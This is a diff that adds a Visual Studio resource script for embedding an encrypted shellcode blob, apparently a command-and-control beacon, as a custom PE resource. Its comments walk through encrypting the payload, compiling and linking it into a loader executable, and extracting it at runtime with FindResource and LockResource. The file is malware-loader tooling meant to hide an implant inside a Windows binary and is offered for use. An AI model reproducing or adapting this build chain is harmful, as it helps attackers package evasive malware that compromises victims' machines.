@@ -1,0 +1,35 @@
+// shellcode.rc
+// Visual Studio RC template for embedding an encrypted shellcode blob
+// as a custom PE resource (.rsrc section).
+//
+// Usage:
+//   1. Encrypt your shellcode:
+//        python encrypt.py beacon.bin -o beacon.enc --array
+//
+//   2. Edit this file:
+//        - Change IDR_SHELLCODE if using a different resource ID
+//        - Change the resource type string ("SHELLCODE") if desired
+//        - Update the filename to match your encrypted blob
+//
+//   3. Add to a Visual Studio project:
+//        - Right-click project → Add → Existing Item → this .rc file
+//        - OR compile manually: rc.exe /fo shellcode.res shellcode.rc
+//          Then link: link /subsystem:console /out:loader.exe loader.obj shellcode.res
+//
+//   4. In your loader, extract with:
+//        HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_SHELLCODE), L"SHELLCODE");
+//        HGLOBAL hMem  = LoadResource(NULL, hRes);
+//        LPVOID  pData = LockResource(hMem);
+//        DWORD   dwSize = SizeofResource(NULL, hRes);
+//
+// Note: Keep the resource type string consistent between the .rc file and the
+// FindResource call in your loader.
+
+#include <windows.h>
+
+// Resource ID — must match MAKEINTRESOURCE(IDR_SHELLCODE) in your loader
+#define IDR_SHELLCODE 101
+
+// Embed the encrypted blob as a custom resource type "SHELLCODE"
+// Change "beacon.enc" to the actual path of your encrypted shellcode file
+IDR_SHELLCODE   SHELLCODE   "beacon.enc"
